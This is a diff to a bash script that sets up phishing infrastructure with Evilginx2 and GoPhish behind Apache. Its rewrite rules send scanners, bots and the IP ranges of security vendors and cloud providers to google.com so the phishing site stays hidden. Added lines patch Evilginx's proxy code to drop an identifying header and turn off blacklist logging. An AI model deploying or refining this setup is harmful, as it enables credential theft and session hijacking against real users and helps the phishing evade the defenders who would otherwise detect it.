@@ -147,7 +147,7 @@ cat <<EOF >/etc/apache2/sites-available/$MYDOMAIN-le-ssl.conf
 # Hardcoded scheme to avoid issues
 Define redir_scheme https
 # Redirect site to:
-Define REDIR_TARGET https://www.microsoft.com
+Define REDIR_TARGET https://www.google.com
 
 <IfModule mod_ssl.c>
 <VirtualHost *:443>
@@ -201,14 +201,14 @@ sleep 60
 
 # Updated redirect rules
 cat <<EOF >/etc/apache2/redirect.rules
-Define REDIR_TARGET https://www.microsoft.com
+Define REDIR_TARGET https://www.google.com
 
 RewriteEngine On
 RewriteOptions Inherit
 
 # Block known scanner IPs
 RewriteCond %{REMOTE_ADDR} ^(185\.199\.|140\.82\.|192\.30\.) [NC]
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 # Class A Exclusions. Includes large ranges from Azure & AWS
 # Cloudfronted requests by default will have a UA of "Amazon Cloudfront"
@@ -218,7 +218,7 @@ RewriteCond                             expr                                    
 RewriteCond                             expr                                    "-R '13.0.0.0/8'" [OR]
 RewriteCond                             expr                                    "-R '35.0.0.0/8'"
 RewriteCond                             %{HTTP_USER_AGENT}                      "!cloudfront" [NC]
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 # AWS Fine Grained
 RewriteCond                             expr                                    "-R '100.20.0.0/16'" [OR]
@@ -336,7 +336,7 @@ RewriteCond                             expr                                    
 RewriteCond                             expr                                    "-R '97.0.0.0/8'" [OR]
 RewriteCond                             expr                                    "-R '98.0.0.0/8'" [OR]
 RewriteCond                             expr                                    "-R '99.0.0.0/8'"
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 # TrendMicro
 RewriteCond                             expr                                    "-R '150.70.0.0/22'"    [OR]
@@ -357,7 +357,7 @@ RewriteCond                             expr                                    
 RewriteCond                             expr                                    "-R '150.70.80.0/20'"   [OR]
 RewriteCond                             expr                                    "-R '150.70.96.0/20'"   [OR]
 RewriteCond                             expr                                    "-R '206.165.76.0/24'"
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 #BlueCoat: @breakersall
 RewriteCond                             expr                                    "-R '199.116.168.0/21'" [OR]
@@ -374,7 +374,7 @@ RewriteCond                             expr                                    
 RewriteCond                             expr                                    "-R '199.254.238.0/24'" [OR]
 RewriteCond                             expr                                    "-R '196.52.48.49'"     [OR]
 RewriteCond                             expr                                    "-R '89.38.150.0/24'"
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 #Palo Alto
 RewriteCond                             expr                                    "-R '154.59.123.0/24'"  [OR]
@@ -392,7 +392,7 @@ RewriteCond                             expr                                    
 RewriteCond                             expr                                    "-R '72.5.65.0/24'"     [OR]
 RewriteCond                             expr                                    "-R '74.201.127.0/24'"  [OR]
 RewriteCond                             expr                                    "-R '74.217.90.0/24'"
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 #ProofPoint
 RewriteCond                             expr                                    "-R '148.163.148.0/22'" [OR]
@@ -409,7 +409,7 @@ RewriteCond                             expr                                    
 RewriteCond                             expr                                    "-R '67.231.149.0/24'"  [OR]
 RewriteCond                             expr                                    "-R '67.231.151.0/24'"  [OR]
 RewriteCond                             expr                                    "-R '67.231.158.0/24'"
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 #Fortigate
 RewriteCond                             expr                                    "-R '173.243.128.0/20'" [OR]
@@ -427,7 +427,7 @@ RewriteCond                             expr                                    
 RewriteCond                             expr                                    "-R '96.45.32.0/20'"    [OR]
 RewriteCond                             expr                                    "-R '96.45.32.0/21'"    [OR]
 RewriteCond                             expr                                    "-R '96.45.40.0/21'"
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 #Symantec
 RewriteCond                             expr                                    "-R '95.45.252.0/29'"   [OR]
@@ -466,11 +466,11 @@ RewriteCond                             expr                                    
 RewriteCond                             expr                                    "-R '198.6.62.0/24'"    [OR]
 RewriteCond                             expr                                    "-R '216.10.192.0/20'"  [OR]
 RewriteCond                             expr                                    "-R '216.10.193.0/24'"
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 # Microsoft
 RewriteCond                             expr                                    "-R '104.40.0.0/13'"
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 # Azure
 RewriteCond                             expr                                    "-R '104.208.0.0/16'" [OR]
@@ -602,15 +602,15 @@ RewriteCond                             %{HTTP_USER_AGENT}                      
 RewriteCond                             %{HTTP_USER_AGENT}                      ^Python-urllib.*$ [OR]
 RewriteCond                             %{HTTP_USER_AGENT}                      ^Wget.*$ [OR]
 RewriteCond                             %{HTTP_USER_AGENT}                      ^Lynx.*$ 
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 
 # Barracuda
 RewriteCond                             expr                                    "-R '64.235.144.0/24'"
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]]
 
 # Slack Bot
 RewriteCond                             %{HTTP_USER_AGENT}                      ^Slackbot-LinkExpanding.*$
-RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]
+RewriteRule ^.*$ https://www.google.com/ [L,R=302]
 EOF
 
 comment_duplicate_vhosts() {
@@ -708,6 +708,7 @@ export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin
 cd /home/ubuntu
 git clone https://github.com/kgretzky/evilginx2.git
 cd evilginx2
+sed -i 's/^[[:space:]]*req.Header.Set(p.getHomeDir(), o_host)/\/\/&/' /home/ubuntu/evilginx2/core/http_proxy.go
 go build
 EOC
 
@@ -736,6 +737,8 @@ tmux send-keys -t EvilginxSession1 "blacklist unauth" C-m
 sleep 3
 tmux send-keys -t EvilginxSession1 "config unauth_url https://$MYFQDN/" C-m
 sleep 2
+tmux send-keys -t EvilginxSession1 "blacklist log off" C-m
+sleep 2
 EOF
 
 #Evilgix setup COMPLETE - Ready to use
@@ -754,6 +757,8 @@ printf "${PURPLE}Join the session with: tmux attach-session -t GoPhishSession1${
 
 apachectl -D DUMP_MODULES | grep ssl
 printf "${RED}Output from above should say: ssl_module (shared), if not run: sudo systemctl reload apache2${NC} \n"
+
+sudo systemctl stop apache2
 
 printf "\n\n${GREEN}Setup Complete! Everything is ready to use! Enjoy!${NC}\n"
 
